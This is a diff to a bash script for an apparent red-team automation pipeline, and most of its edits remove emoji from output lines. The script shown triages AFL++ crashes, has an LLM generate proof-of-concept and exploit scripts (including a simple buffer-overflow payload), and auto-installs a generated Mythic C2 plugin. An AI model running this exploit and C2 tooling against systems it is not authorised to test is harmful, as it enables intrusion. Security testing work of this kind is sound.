@@ -20,7 +20,7 @@ fi
 
 mkdir -p out
 
-echo "🚀 Red Team Automation Suite - Full Analysis Pipeline"
+echo "Red Team Automation Suite - Full Analysis Pipeline"
 echo "==============================================="
 echo "Target Binary: $TARGET_BINARY"
 echo "Source File: $SOURCE_FILE"
@@ -28,14 +28,14 @@ echo "==============================================="
 
 echo -e "\n=== Step 1: Checking for Crashes ==="
 if [ ! -d "$CRASHES_DIR" ] || [ -z "$(ls -A $CRASHES_DIR 2>/dev/null)" ]; then
-    echo "❌ No crashes found in $CRASHES_DIR"
+    echo "No crashes found in $CRASHES_DIR"
     echo "Make sure AFL++ has been run and found crashes."
     echo "Expected directory structure: out/default/crashes/"
     exit 1
 fi
 
 CRASH_COUNT=$(find "$CRASHES_DIR" -type f -not -name "README.txt" | wc -l)
-echo "✅ Found $CRASH_COUNT crash files in $CRASHES_DIR"
+echo "Found $CRASH_COUNT crash files in $CRASHES_DIR"
 echo "Skipping minimization - triage.py will handle deduplication by stack frame"
 
 echo -e "\n=== Step 2: Crash Triage ==="
@@ -43,23 +43,23 @@ echo "🔍 Running crash triage with GDB analysis..."
 CRASHES_DIR="$CRASHES_DIR" TARGET_BINARY="$TARGET_BINARY" OUTPUT_JSON="$TRIAGE_JSON" python3 triage.py
 
 if [ ! -f "$TRIAGE_JSON" ]; then
-    echo "❌ Triage failed - no triage results generated"
+    echo "Triage failed - no triage results generated"
     exit 1
 fi
 
 echo -e "\n=== Step 3: Binary Protection Analysis ==="
-echo "🛡️ Analyzing binary security protections..."
+echo "Analyzing binary security protections..."
 python3 binary_analyzer.py "$TARGET_BINARY" --output "$BINARY_ANALYSIS_JSON"
 
 if [ $? -eq 0 ] && [ -f "$BINARY_ANALYSIS_JSON" ]; then
-    echo "✅ Binary protection analysis completed successfully"
+    echo "Binary protection analysis completed successfully"
 else
-    echo "⚠️ Warning: Binary protection analysis failed - continuing with limited data"
+    echo "Warning: Binary protection analysis failed - continuing with limited data"
     echo "{\"error\": \"Binary analysis not available\"}" > "$BINARY_ANALYSIS_JSON"
 fi
 
 echo -e "\n=== Step 4: LLM-Powered Vulnerability Analysis ==="
-echo "🧠 Starting intelligent vulnerability analysis..."
+echo "Starting intelligent vulnerability analysis..."
 
 # Check if source file exists
 LLM_SOURCE_ARG=""
@@ -67,25 +67,24 @@ if [ -f "$SOURCE_FILE" ]; then
     echo "📄 Source code found: $SOURCE_FILE"
     LLM_SOURCE_ARG="--source-file $SOURCE_FILE"
 else
-    echo "⚠️  Source code not found: $SOURCE_FILE (analysis will be limited)"
+    echo " Source code not found: $SOURCE_FILE (analysis will be limited)"
 fi
 
-# Run LLM analysis
 python3 llm_analyzer.py --triage-json "$TRIAGE_JSON" $LLM_SOURCE_ARG --binary-analysis "$BINARY_ANALYSIS_JSON" --output "$LLM_ANALYSIS_JSON"
 
 if [ $? -eq 0 ] && [ -f "$LLM_ANALYSIS_JSON" ]; then
-    echo "✅ LLM analysis completed successfully"
+    echo "LLM analysis completed successfully"
 else
-    echo "⚠️  LLM analysis failed or unavailable - continuing with basic analysis"
+    echo "LLM analysis failed or unavailable - continuing with basic analysis"
     echo "{\"error\": \"LLM analysis not available\"}" > "$LLM_ANALYSIS_JSON"
 fi
 
 echo -e "\n=== Step 5: Extract AI-Generated Exploits ==="
-echo "💥 Extracting AI-generated PoC and exploits..."
+echo "Extracting AI-generated PoC and exploits..."
 
 # Check if LLM analysis generated dynamic PoC code
 if [ -f "$LLM_ANALYSIS_JSON" ]; then
-    echo "🧠 Extracting AI-generated PoC from LLM analysis..."
+    echo "Extracting AI-generated PoC from LLM analysis..."
     
     # Extract the AI-generated PoC code
     python3 -c "
@@ -100,9 +99,8 @@ with open('$LLM_ANALYSIS_JSON', 'r') as f:
 # Extract AI-generated PoC
 poc_data = llm_data.get('dynamic_poc_generation', {})
 if poc_data.get('generated_successfully') and poc_data.get('poc_code'):
-    print('✅ AI-generated PoC found - extracting...')
-    
-    # Get the generated PoC code
+    print('AI-generated PoC found - extracting...')
+        # Get the generated PoC code
     poc_code = poc_data['poc_code']
     
     # Fix target binary path - replace common incorrect patterns
@@ -124,11 +122,11 @@ if poc_data.get('generated_successfully') and poc_data.get('poc_code'):
     
     # Make it executable
     os.chmod('$POC_OUTPUT', 0o755)
-    print('✅ AI-generated PoC saved to: $POC_OUTPUT')
-    print(f'🎯 Target corrected to: {target_binary}')
-    print(f'🎯 Vulnerability-specific for: {poc_data.get(\"vulnerability_type\", \"unknown\")}')
+    print('AI-generated PoC saved to: $POC_OUTPUT')
+    print(f'Target corrected to: {target_binary}')
+    print(f'Vulnerability-specific for: {poc_data.get(\"vulnerability_type\", \"unknown\")}')
 else:
-    print('⚠️ No AI-generated PoC found - creating basic fallback')
+    print('No AI-generated PoC found - creating basic fallback')
     
     # Create basic fallback PoC with correct target
     fallback_poc = f'''#!/usr/bin/env python3
@@ -143,14 +141,14 @@ def main():
         target = sys.argv[1]
     
     if not os.path.exists(target):
-        print(f\"❌ Target not found: {{target}}\")
+        print(f\"Target not found: {{target}}\")
         print(f\"Expected: $TARGET_BINARY\")
         return 1
     
     payload = b\"A\" * 64 + b\"BBBB\"
     
-    print(f\"🎯 Testing payload against: {{target}}\")
-    print(f\"📦 Payload size: {{len(payload)}} bytes\")
+    print(f\"Testing payload against: {{target}}\")
+    print(f\"Payload size: {{len(payload)}} bytes\")
     
     with tempfile.NamedTemporaryFile(delete=False) as f:
         f.write(payload)
@@ -159,16 +157,16 @@ def main():
     try:
         result = subprocess.run([target, temp_path], capture_output=True)
         if result.returncode != 0:
-            print(f\"✅ Crash detected! Exit code: {{result.returncode}}\")
+            print(f\"Crash detected! Exit code: {{result.returncode}}\")
             if result.stderr:
                 stderr = result.stderr.decode('utf-8', errors='replace')
                 if \"segmentation fault\" in stderr.lower():
-                    print(\"🎯 Segmentation fault confirmed!\")
+                    print(\"Segmentation fault confirmed!\")
         else:
-            print(\"❌ No crash detected\")
+            print(\"No crash detected\")
         return 0
     except Exception as e:
-        print(f\"❌ Error: {{e}}\")
+        print(f\"Error: {{e}}\")
         return 1
     finally:
         os.unlink(temp_path)
@@ -180,12 +178,12 @@ if __name__ == \"__main__\":
     with open('$POC_OUTPUT', 'w') as f:
         f.write(fallback_poc)
     os.chmod('$POC_OUTPUT', 0o755)
-    print('📝 Basic fallback PoC created with correct target')
+    print('Basic fallback PoC created with correct target')
 
 # Extract AI-generated exploit strategy for advanced exploit
 exploit_strategy = llm_data.get('dynamic_exploit_strategy', {})
 if exploit_strategy and 'error' not in exploit_strategy:
-    print('✅ AI-generated exploit strategy found - creating advanced exploit...')
+    print('AI-generated exploit strategy found - creating advanced exploit...')
     
     # Get vulnerability info
     vuln_info = llm_data.get('vulnerability_classification', {})
@@ -221,9 +219,9 @@ class AdvancedExploit:
         # AI-determined parameters
         offset = 64  # From crash analysis
         
-        print(f\"🎯 Creating {{self.vuln_type}} payload...\")
-        print(f\"📊 Strategy: {{self.strategy}}\")
-        print(f\"🎲 Success Probability: {{self.success_probability}}\")
+        print(f\"Creating {{self.vuln_type}} payload...\")
+        print(f\"Strategy: {{self.strategy}}\")
+        print(f\"Success Probability: {{self.success_probability}}\")
         
         if \"{vuln_type}\" == \"stack_buffer_overflow\":
             return self.create_stack_overflow_payload(offset)
@@ -258,11 +256,11 @@ class AdvancedExploit:
     def execute_exploit(self):
         \"\"\"Execute the exploit\"\"\"
         if not os.path.exists(self.target):
-            print(f\"❌ Target not found: {{self.target}}\")
+            print(f\"Target not found: {{self.target}}\")
             return False
         
         payload = self.create_payload()
-        print(f\"📦 Payload size: {{len(payload)}} bytes\")
+        print(f\"Payload size: {{len(payload)}} bytes\")
         
         with tempfile.NamedTemporaryFile(delete=False) as f:
             f.write(payload)
@@ -276,21 +274,21 @@ class AdvancedExploit:
             )
             
             if process.returncode != 0:
-                print(f\"✅ Exploit successful! Exit code: {{process.returncode}}\")
+                print(f\"Exploit successful! Exit code: {{process.returncode}}\")
                 if process.stderr:
                     stderr = process.stderr.decode('utf-8', errors='replace')
                     if \"segmentation fault\" in stderr.lower():
-                        print(\"🎯 Segmentation fault confirmed!\")
+                        print(\"Segmentation fault confirmed!\")
                 return True
             else:
-                print(\"❌ Exploit failed - no crash detected\")
+                print(\"Exploit failed - no crash detected\")
                 return False
                 
         except subprocess.TimeoutExpired:
-            print(\"⏰ Exploit timed out - possible infinite loop or hang\")
+            print(\"Exploit timed out - possible infinite loop or hang\")
             return True  # Might be successful
         except Exception as e:
-            print(f\"❌ Exploit error: {{e}}\")
+            print(f\"Exploit error: {{e}}\")
             return False
         finally:
             os.unlink(temp_path)
@@ -301,7 +299,7 @@ def main():
     if len(sys.argv) > 1:
         target = sys.argv[1]
     
-    print(\"🎯 AI-Generated Advanced Exploit\")
+    print(\"AI-Generated Advanced Exploit\")
     print(f\"Target: {{target}}\")
     print(f\"Vulnerability: {vuln_type}\")
     print(f\"Strategy: {exploit_strategy.get('exploitation_approach', 'Unknown')}\")
@@ -319,13 +317,13 @@ if __name__ == \"__main__\":
     with open('$EXPLOIT_OUTPUT', 'w') as f:
         f.write(advanced_exploit)
     os.chmod('$EXPLOIT_OUTPUT', 0o755)
-    print('✅ AI-generated advanced exploit saved to: $EXPLOIT_OUTPUT')
-    print(f'🎯 Target corrected to: $TARGET_BINARY')
+    print('AI-generated advanced exploit saved to: $EXPLOIT_OUTPUT')
+    print(f'Target corrected to: $TARGET_BINARY')
 else:
-    print('⚠️ No AI exploit strategy found - skipping advanced exploit generation')
+    print('No AI exploit strategy found - skipping advanced exploit generation')
 "
 else
-    echo "⚠️ No LLM analysis found - creating basic PoC"
+    echo "No LLM analysis found - creating basic PoC"
     
     # Create very basic PoC
     cat > "$POC_OUTPUT" << 'EOF'
@@ -349,17 +347,17 @@ EOF
 fi
 
 echo -e "\n=== Step 6: Mythic C2 Framework Integration ==="
-echo "🏰 Generating and auto-installing Mythic C2 plugins..."
+echo "Generating and auto-installing Mythic C2 plugins..."
 
 # Check if Mythic integration should be attempted
 echo "Checking Mythic C2 availability..."
 
 # Test Mythic connection first
 if python3 test_mythic_connection.py 2>/dev/null; then
-    echo "✅ Mythic is running and accessible"
+    echo "Mythic is running and accessible"
     
     # Run Mythic integration to generate files
-    echo "🔧 Generating Mythic plugin and payload files..."
+    echo "Generating Mythic plugin and payload files..."
     python3 mythic_integrator.py \
         --vulnerability-analysis "$LLM_ANALYSIS_JSON" \
         --binary-analysis "$BINARY_ANALYSIS_JSON" \
@@ -367,10 +365,10 @@ if python3 test_mythic_connection.py 2>/dev/null; then
         --output-dir "$MYTHIC_OUTPUT_DIR"
     
     if [ $? -eq 0 ]; then
-        echo "✅ Mythic artifacts generated successfully"
+        echo "Mythic artifacts generated successfully"
         
         # Auto-install the plugin into Mythic
-        echo "🔧 Auto-installing plugin into Mythic..."
+        echo "Auto-installing plugin into Mythic..."
         
         # Find Mythic directory
         MYTHIC_DIR=""
@@ -383,7 +381,7 @@ if python3 test_mythic_connection.py 2>/dev/null; then
         fi
         
         if [ -n "$MYTHIC_DIR" ] && [ -f "$MYTHIC_DIR/mythic-cli" ]; then
-            echo "📁 Found Mythic installation: $MYTHIC_DIR"
+            echo "Found Mythic installation: $MYTHIC_DIR"
             
             # Get plugin name from metadata
             PLUGIN_NAME=$(python3 -c "
@@ -398,7 +396,7 @@ with open('$MYTHIC_OUTPUT_DIR/mythic_plugin/plugin_metadata.json') as f:
             mkdir -p "$PLUGIN_DIR/mythic"
             mkdir -p "$PLUGIN_DIR/agent_code"
             
-            echo "📁 Created plugin directory: $PLUGIN_DIR"
+            echo "Created plugin directory: $PLUGIN_DIR"
             
             # Copy plugin files
             cp "$MYTHIC_OUTPUT_DIR/mythic_plugin/plugin_code.py" "$PLUGIN_DIR/mythic/agent_functions.py"
@@ -445,15 +443,15 @@ if __name__ == "__main__":
     asyncio.run(main())
 EOF
             
-            echo "✅ Plugin files installed successfully"
+            echo "Plugin files installed successfully"
             
             # Restart Mythic to load the new plugin
-            echo "🔄 Restarting Mythic to load new plugin..."
+            echo "Restarting Mythic to load new plugin..."
             cd "$MYTHIC_DIR"
             
             # Stop and start Mythic
             sudo ./mythic-cli stop >/dev/null 2>&1
-            echo "⏳ Starting Mythic with new plugin (this may take 30-60 seconds)..."
+            echo "Starting Mythic with new plugin (this may take 30-60 seconds)..."
             sudo ./mythic-cli start >/dev/null 2>&1
             
             # Wait for services to be ready
@@ -462,35 +460,35 @@ EOF
             # Test if Mythic is back up
             cd - >/dev/null
             if python3 test_mythic_connection.py >/dev/null 2>&1; then
-                echo "✅ Mythic restarted successfully with new plugin!"
-                echo "🎯 Plugin '$PLUGIN_NAME' is now available in Mythic UI"
+                echo "Mythic restarted successfully with new plugin!"
+                echo "Plugin '$PLUGIN_NAME' is now available in Mythic UI"
                 MYTHIC_INTEGRATION_SUCCESS=true
                 MYTHIC_PLUGIN_NAME="$PLUGIN_NAME"
             else
-                echo "⚠️ Mythic restart may have failed - check manually"
+                echo "Mythic restart may have failed - check manually"
                 MYTHIC_INTEGRATION_SUCCESS=false
                 MYTHIC_PLUGIN_NAME=""
             fi
             
         else
-            echo "⚠️ Could not find Mythic installation directory"
-            echo "📁 Plugin files generated in: $MYTHIC_OUTPUT_DIR/"
-            echo "🔧 Manual installation may be required"
+            echo "Could not find Mythic installation directory"
+            echo "Plugin files generated in: $MYTHIC_OUTPUT_DIR/"
+            echo "Manual installation may be required"
             MYTHIC_INTEGRATION_SUCCESS=false
         fi
         
     else
-        echo "⚠️ Mythic integration failed - continuing without C2 components"
+        echo "Mythic integration failed - continuing without C2 components"
         MYTHIC_INTEGRATION_SUCCESS=false
     fi
     
 elif command -v docker &> /dev/null; then
-    echo "⚠️ Docker found but Mythic not accessible"
-    echo "🔧 Try fixing Mythic with: ./mythic_troubleshoot.sh"
-    echo "📝 Or test connection with: python3 test_mythic_connection.py"
+    echo "Docker found but Mythic not accessible"
+    echo "Try fixing Mythic with: ./mythic_troubleshoot.sh"
+    echo "Or test connection with: python3 test_mythic_connection.py"
     
     # Still try to generate offline C2 artifacts
-    echo "🔄 Generating offline C2 artifacts..."
+    echo "Generating offline C2 artifacts..."
     python3 mythic_integrator.py \
         --vulnerability-analysis "$LLM_ANALYSIS_JSON" \
         --binary-analysis "$BINARY_ANALYSIS_JSON" \
@@ -499,20 +497,20 @@ elif command -v docker &> /dev/null; then
         2>/dev/null
     
     if [ $? -eq 0 ]; then
-        echo "✅ Offline C2 artifacts generated (Mythic connection failed)"
+        echo "Offline C2 artifacts generated (Mythic connection failed)"
         MYTHIC_INTEGRATION_SUCCESS=false
     else
-        echo "❌ C2 artifact generation failed"
+        echo "C2 artifact generation failed"
         MYTHIC_INTEGRATION_SUCCESS=false
     fi
 else
-    echo "❌ Docker not found - skipping Mythic integration"
-    echo "🔧 Install Docker and run: ./mythic_troubleshoot.sh"
+    echo "Docker not found - skipping Mythic integration"
+    echo "Install Docker and run: ./mythic_troubleshoot.sh"
     MYTHIC_INTEGRATION_SUCCESS=false
 fi
 
 echo -e "\n=== Step 7: Generate Comprehensive Report ==="
-echo "📊 Creating comprehensive analysis report..."
+echo "Creating comprehensive analysis report..."
 
 # Create the enhanced report generator
 cat > generate_comprehensive_report.py << 'EOF'
@@ -557,7 +555,7 @@ def create_comprehensive_report():
 
     # Create comprehensive report
     with open('comprehensive_security_report.md', 'w') as f:
-        f.write('# 🛡️ Red Team Automation Suite - Comprehensive Security Report\n\n')
+        f.write('# Red Team Automation Suite - Comprehensive Security Report\n\n')
         f.write(f'**Target Binary:** `{os.path.basename(target_binary)}`  \n')
         f.write(f'**Source File:** `{source_file}`  \n')
         f.write(f'**Analysis Date:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}  \n')
@@ -565,21 +563,21 @@ def create_comprehensive_report():
         f.write(f'**Unique Crash Frames:** {triage_data["unique_crash_frames"]}  \n\n')
         
         # Executive Summary
-        f.write('## 🎯 Executive Summary\n\n')
+        f.write('## Executive Summary\n\n')
         
         if llm_data.get('vulnerability_classification'):
             vuln = llm_data['vulnerability_classification']
-            f.write(f'**🚨 Critical Finding:** {vuln.get("vulnerability_type", "Unknown")} vulnerability detected  \n')
-            f.write(f'**⚠️ Risk Level:** {vuln.get("severity", "Unknown")}  \n')
-            f.write(f'**🎯 Exploitability:** {vuln.get("confidence", 0):.0%} confidence  \n\n')
+            f.write(f'**Critical Finding:** {vuln.get("vulnerability_type", "Unknown")} vulnerability detected  \n')
+            f.write(f'**Risk Level:** {vuln.get("severity", "Unknown")}  \n')
+            f.write(f'**Exploitability:** {vuln.get("confidence", 0):.0%} confidence  \n\n')
         
         if binary_data.get('exploit_mitigation_summary'):
             summary = binary_data['exploit_mitigation_summary']
-            f.write(f'**🛡️ Defense Level:** {summary.get("protection_level", "Unknown")}  \n')
-            f.write(f'**⚔️ Exploit Difficulty:** {summary.get("exploit_difficulty", "Unknown")}  \n\n')
+            f.write(f'**Defense Level:** {summary.get("protection_level", "Unknown")}  \n')
+            f.write(f'**Exploit Difficulty:** {summary.get("exploit_difficulty", "Unknown")}  \n\n')
         
         # Risk Assessment
-        f.write('### 🔥 Risk Assessment\n\n')
+        f.write('### Risk Assessment\n\n')
         
         risk_factors = []
         if binary_data.get('exploit_mitigation_summary', {}).get('protection_level') == 'Low':
@@ -597,12 +595,12 @@ def create_comprehensive_report():
         f.write('\n')
         
         # Technical Analysis
-        f.write('## 🔬 Technical Analysis\n\n')
+        f.write('## Technical Analysis\n\n')
         
         # Vulnerability Details
         if llm_data.get('vulnerability_classification'):
             vuln = llm_data['vulnerability_classification']
-            f.write('### 🎯 Vulnerability Classification\n\n')
+            f.write('### Vulnerability Classification\n\n')
             f.write(f'**Type:** {vuln.get("vulnerability_type", "Unknown")}  \n')
             f.write(f'**Severity:** {vuln.get("severity", "Unknown")}  \n')
             f.write(f'**Attack Vector:** {vuln.get("attack_vector", "Unknown")}  \n')
@@ -611,20 +609,20 @@ def create_comprehensive_report():
         
         # Binary Protections
         if binary_data and 'error' not in binary_data:
-            f.write('### 🛡️ Binary Protection Analysis\n\n')
+            f.write('### Binary Protection Analysis\n\n')
             
             f.write('| Protection | Status | Impact |\n')
             f.write('|------------|--------|--------|\n')
-            f.write(f'| ASLR | {"🔴 Disabled" if not binary_data.get("aslr_system", {}).get("enabled") else "🟢 Enabled"} | {"High risk - fixed addresses" if not binary_data.get("aslr_system", {}).get("enabled") else "Mitigated"} |\n')
-            f.write(f'| NX Bit | {"🔴 Disabled" if not binary_data.get("nx_bit", {}).get("enabled") else "🟢 Enabled"} | {"High risk - shellcode execution" if not binary_data.get("nx_bit", {}).get("enabled") else "ROP required"} |\n')
-            f.write(f'| Stack Canaries | {"🔴 Disabled" if not binary_data.get("stack_canaries", {}).get("enabled") else "🟢 Enabled"} | {"High risk - direct overflow" if not binary_data.get("stack_canaries", {}).get("enabled") else "Leak required"} |\n')
-            f.write(f'| PIE | {"🔴 Disabled" if not binary_data.get("pie", {}).get("enabled") else "🟢 Enabled"} | {"Medium risk - fixed code base" if not binary_data.get("pie", {}).get("enabled") else "Code leak required"} |\n')
+            f.write(f'| ASLR | {"Disabled" if not binary_data.get("aslr_system", {}).get("enabled") else "Enabled"} | {"High risk - fixed addresses" if not binary_data.get("aslr_system", {}).get("enabled") else "Mitigated"} |\n')
+            f.write(f'| NX Bit | {"Disabled" if not binary_data.get("nx_bit", {}).get("enabled") else "Enabled"} | {"High risk - shellcode execution" if not binary_data.get("nx_bit", {}).get("enabled") else "ROP required"} |\n')
+            f.write(f'| Stack Canaries | {"Disabled" if not binary_data.get("stack_canaries", {}).get("enabled") else "Enabled"} | {"High risk - direct overflow" if not binary_data.get("stack_canaries", {}).get("enabled") else "Leak required"} |\n')
+            f.write(f'| PIE | {"Disabled" if not binary_data.get("pie", {}).get("enabled") else "Enabled"} | {"Medium risk - fixed code base" if not binary_data.get("pie", {}).get("enabled") else "Code leak required"} |\n')
             f.write(f'| RELRO | {binary_data.get("relro", {}).get("status", "Unknown")} | {"GOT overwrite possible" if "No RELRO" in binary_data.get("relro", {}).get("status", "") else "GOT protected"} |\n\n')
         
         # Exploit Analysis
         if llm_data.get('dynamic_exploit_strategy'):
             strategy = llm_data['dynamic_exploit_strategy']
-            f.write('### ⚔️ Exploitation Strategy\n\n')
+            f.write('### Exploitation Strategy\n\n')
             f.write(f'**Approach:** {strategy.get("exploitation_approach", "Unknown")}  \n')
             f.write(f'**Success Probability:** {strategy.get("success_probability", "Unknown")}  \n')
             f.write(f'**Complexity:** {strategy.get("complexity", "Unknown")}  \n\n')
@@ -636,29 +634,29 @@ def create_comprehensive_report():
                 f.write('\n')
         
         # Generated Artifacts
-        f.write('## 🛠️ Generated Security Artifacts\n\n')
+        f.write('## Generated Security Artifacts\n\n')
         
-        f.write('### 📝 Proof of Concept\n')
+        f.write('### Proof of Concept\n')
         if os.path.exists(poc_output):
-            f.write(f'✅ **Basic PoC:** [`{os.path.basename(poc_output)}`]({os.path.basename(poc_output)})  \n')
+            f.write(f'**Basic PoC:** [`{os.path.basename(poc_output)}`]({os.path.basename(poc_output)})  \n')
         else:
-            f.write('❌ **Basic PoC:** Generation failed  \n')
+            f.write('**Basic PoC:** Generation failed  \n')
         
         if os.path.exists(exploit_output):
-            f.write(f'✅ **Advanced Exploit:** [`{os.path.basename(exploit_output)}`]({os.path.basename(exploit_output)})  \n')
+            f.write(f'**Advanced Exploit:** [`{os.path.basename(exploit_output)}`]({os.path.basename(exploit_output)})  \n')
         else:
-            f.write('❌ **Advanced Exploit:** Not generated  \n')
+            f.write('**Advanced Exploit:** Not generated  \n')
         
         f.write('\n')
         
         # Mythic C2 Integration
-        f.write('### 🏰 C2 Framework Integration\n')
+        f.write('### C2 Framework Integration\n')
         if mythic_success:
-            f.write('✅ **Mythic C2 Plugin:** Successfully generated and auto-installed  \n')
+            f.write('**Mythic C2 Plugin:** Successfully generated and auto-installed  \n')
             if mythic_plugin_name:
-                f.write(f'🎯 **Plugin Name:** `{mythic_plugin_name}`  \n')
-            f.write(f'📁 **C2 Artifacts:** [`{mythic_output_dir}/`]({mythic_output_dir}/)  \n')
-            f.write('🚀 **Operational Ready:** Yes - fully automated deployment  \n\n')
+                f.write(f'**Plugin Name:** `{mythic_plugin_name}`  \n')
+            f.write(f'**C2 Artifacts:** [`{mythic_output_dir}/`]({mythic_output_dir}/)  \n')
+            f.write('**Operational Ready:** Yes - fully automated deployment  \n\n')
             
             # Add C2 usage instructions
             f.write('**Mythic Usage Instructions:**\n')
@@ -670,13 +668,13 @@ def create_comprehensive_report():
                 f.write('3. Generate payload using your custom plugin\n')
             f.write('4. Execute against target for immediate exploitation\n\n')
         else:
-            f.write('❌ **Mythic C2 Plugin:** Generation failed or manual installation required  \n')
-            f.write('🎯 **Operational Ready:** No - manual C2 setup required  \n\n')
+            f.write('**Mythic C2 Plugin:** Generation failed or manual installation required  \n')
+            f.write('**Operational Ready:** No - manual C2 setup required  \n\n')
         
         # Source Code Analysis
         if llm_data.get('source_code_analysis'):
             source_analysis = llm_data['source_code_analysis']
-            f.write('### 📄 Source Code Analysis\n\n')
+            f.write('### Source Code Analysis\n\n')
             f.write(f'**Vulnerable Function:** `{source_analysis.get("vulnerable_function", "Unknown")}`  \n')
             f.write(f'**Root Cause:** {source_analysis.get("root_cause", "Unknown")}  \n')
             f.write(f'**Attack Surface:** {source_analysis.get("attack_surface", "Unknown")}  \n\n')
@@ -690,28 +688,28 @@ def create_comprehensive_report():
         # Patch Recommendations
         if llm_data.get('patch_recommendations'):
             patches = llm_data['patch_recommendations']
-            f.write('## 🔧 Remediation Strategy\n\n')
+            f.write('## Remediation Strategy\n\n')
             
-            f.write('### 🚨 Immediate Actions Required\n\n')
+            f.write('### Immediate Actions Required\n\n')
             if patches.get('immediate_fixes'):
                 for fix in patches['immediate_fixes']:
                     f.write(f'1. **{fix}**\n')
                 f.write('\n')
             
             if patches.get('corrected_code_snippet'):
-                f.write('### 💻 Code Fix Example\n\n')
+                f.write('### Code Fix Example\n\n')
                 f.write('```c\n')
                 f.write(patches['corrected_code_snippet'])
                 f.write('\n```\n\n')
             
             if patches.get('long_term_recommendations'):
-                f.write('### 🏗️ Long-term Security Improvements\n\n')
+                f.write('### Long-term Security Improvements\n\n')
                 for rec in patches['long_term_recommendations']:
                     f.write(f'- {rec}\n')
                 f.write('\n')
         
         # Technical Details
-        f.write('## 🔍 Detailed Technical Findings\n\n')
+        f.write('## Detailed Technical Findings\n\n')
         
         for i, (frame, data) in enumerate(triage_data["groups"].items()):
             f.write(f'### Crash Group {i+1}: {frame}\n\n')
@@ -721,37 +719,37 @@ def create_comprehensive_report():
             
             if i == 0:  # Primary crash
                 f.write('**Analysis Status:**\n')
-                f.write('- ✅ Primary crash analyzed\n')
-                f.write('- ✅ PoC generated\n')
-                f.write('- ✅ Exploit strategy developed\n')
+                f.write('- Primary crash analyzed\n')
+                f.write('- PoC generated\n')
+                f.write('- Exploit strategy developed\n')
                 if mythic_success:
-                    f.write('- ✅ C2 integration completed\n')
+                    f.write('- C2 integration completed\n')
                 f.write('\n')
             else:
                 f.write('**Analysis Status:** Secondary crash (not fully analyzed)\n\n')
         
         # Appendix
-        f.write('## 📋 Appendix\n\n')
-        f.write('### 🗂️ Generated Files\n\n')
+        f.write('## Appendix\n\n')
+        f.write('### Generated Files\n\n')
         files_table = [
             ('File', 'Description', 'Status'),
             ('---', '---', '---'),
-            (triage_json, 'Crash triage results', '✅ Generated'),
-            (binary_analysis_json, 'Binary protection analysis', '✅ Generated' if os.path.exists(binary_analysis_json) else '❌ Failed'),
-            (llm_analysis_json, 'AI vulnerability analysis', '✅ Generated' if os.path.exists(llm_analysis_json) else '❌ Failed'),
-            (poc_output, 'Basic proof of concept', '✅ Generated' if os.path.exists(poc_output) else '❌ Failed'),
-            (exploit_output, 'Advanced exploit', '✅ Generated' if os.path.exists(exploit_output) else '❌ Failed'),
+            (triage_json, 'Crash triage results', 'Generated'),
+            (binary_analysis_json, 'Binary protection analysis', 'Generated' if os.path.exists(binary_analysis_json) else 'Failed'),
+            (llm_analysis_json, 'AI vulnerability analysis', 'Generated' if os.path.exists(llm_analysis_json) else 'Failed'),
+            (poc_output, 'Basic proof of concept', 'Generated' if os.path.exists(poc_output) else 'Failed'),
+            (exploit_output, 'Advanced exploit', 'Generated' if os.path.exists(exploit_output) else 'Failed'),
         ]
         
         if mythic_success:
-            files_table.append((f'{mythic_output_dir}/', 'Mythic C2 artifacts (auto-installed)', '✅ Generated & Installed'))
+            files_table.append((f'{mythic_output_dir}/', 'Mythic C2 artifacts (auto-installed)', 'Generated & Installed'))
         elif os.path.exists(mythic_output_dir):
-            files_table.append((f'{mythic_output_dir}/', 'Mythic C2 artifacts', '⚠️ Generated (manual install needed)'))
+            files_table.append((f'{mythic_output_dir}/', 'Mythic C2 artifacts', 'Generated (manual install needed)'))
         
         for row in files_table:
             f.write(f'| {row[0]} | {row[1]} | {row[2]} |\n')
         
-        f.write('\n### 🔗 References\n\n')
+        f.write('\n### References\n\n')
         f.write('- [AFL++ Fuzzing](https://github.com/AFLplusplus/AFLplusplus)\n')
         f.write('- [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)\n')
         f.write('- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)\n')
@@ -760,7 +758,7 @@ def create_comprehensive_report():
         f.write('---\n')
         f.write('*Report generated by Red Team Automation Suite*\n')
 
-    print('📊 Comprehensive security report created: comprehensive_security_report.md')
+    print('Comprehensive security report created: comprehensive_security_report.md')
 
 if __name__ == "__main__":
     create_comprehensive_report()
@@ -782,32 +780,32 @@ python3 generate_comprehensive_report.py
 rm generate_comprehensive_report.py
 
 echo -e "\n=== Step 8: Testing Generated Exploits ==="
-echo "🧪 Testing proof of concept..."
+echo "Testing proof of concept..."
 if [ -x "$POC_OUTPUT" ]; then
     echo "Running basic PoC..."
     python3 "$POC_OUTPUT"
 else
-    echo "⚠️ Basic PoC not found or not executable"
+    echo "Basic PoC not found or not executable"
 fi
 
 if [ -x "$EXPLOIT_OUTPUT" ]; then
     echo "Running advanced exploit..."
     python3 "$EXPLOIT_OUTPUT"
 else
-    echo "⚠️ Advanced exploit not found or not executable"
+    echo "Advanced exploit not found or not executable"
 fi
-echo "🎨 Creating sleek web dashboard for results..."
+echo "Creating sleek web dashboard for results..."
 
 # Generate the professional dashboard
 python3 dashboard_generator.py
 
 if [ $? -eq 0 ]; then
-    echo "✅ Professional dashboard generated successfully!"
+    echo "Professional dashboard generated successfully!"
     echo ""
-    echo "🎉 DASHBOARD READY! Launch with:"
+    echo "DASHBOARD READY! Launch with:"
     echo "   ./start_dashboard.sh"
     echo ""
-    echo "🌐 Features:"
+    echo "Features:"
     echo "   • Executive security overview with metrics"
     echo "   • AI-generated vulnerability analysis" 
     echo "   • Interactive charts and visualizations"
@@ -817,21 +815,21 @@ if [ $? -eq 0 ]; then
     echo ""
     
     # Offer to auto-launch dashboard
-    echo "🚀 Auto-launch dashboard now? (y/n)"
+    echo "Auto-launch dashboard now? (y/n)"
     read -t 10 -r AUTO_LAUNCH || AUTO_LAUNCH="y"
     
     if [[ "$AUTO_LAUNCH" =~ ^([yY][eE][sS]|[yY]|^$) ]]; then
-        echo "🌐 Launching dashboard in 3 seconds..."
+        echo "Launching dashboard in 3 seconds..."
         sleep 3
         
         # Install Flask if needed
         if ! python3 -c "import flask" 2>/dev/null; then
-            echo "📦 Installing Flask for dashboard..."
+            echo "Installing Flask for dashboard..."
             pip3 install flask markdown
         fi
         
         # Launch dashboard in background
-        echo "🚀 Starting dashboard server..."
+        echo "Starting dashboard server..."
         cd security_dashboard
         nohup python3 app.py > dashboard.log 2>&1 &
